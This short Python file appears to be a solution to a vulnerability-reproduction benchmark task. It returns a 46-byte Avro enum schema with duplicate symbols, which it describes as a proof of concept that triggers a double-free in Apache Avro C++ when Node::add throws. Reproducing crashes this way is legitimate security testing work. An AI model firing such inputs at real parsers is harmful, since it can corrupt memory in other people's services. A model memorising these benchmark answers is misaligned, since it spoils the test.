import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The problem describes a double-free vulnerability in 'Node::add' when an exception is thrown.
        The task name 'arvo' is an anagram for 'avro' (Apache Avro).
        This matches a known vulnerability in Apache Avro C++ (likely related to AVRO-2099),
        where adding a duplicate symbol to an Enum or duplicate field to a Record throws an exception,
        triggering a double-free of the node being added.
        
        The ground truth length is 60 bytes. A minimal Avro Enum schema with duplicate symbols
        is approximately 46-50 bytes and triggers the exception.
        """
        # Minimal Avro schema defining an enum with duplicate symbols "a".
        # This causes NodeEnum::add to throw an exception ("Symbol 'a' already exists"),
        # triggering the double-free in the vulnerable version.
        return b'{"type":"enum","name":"n","symbols":["a","a"]}'
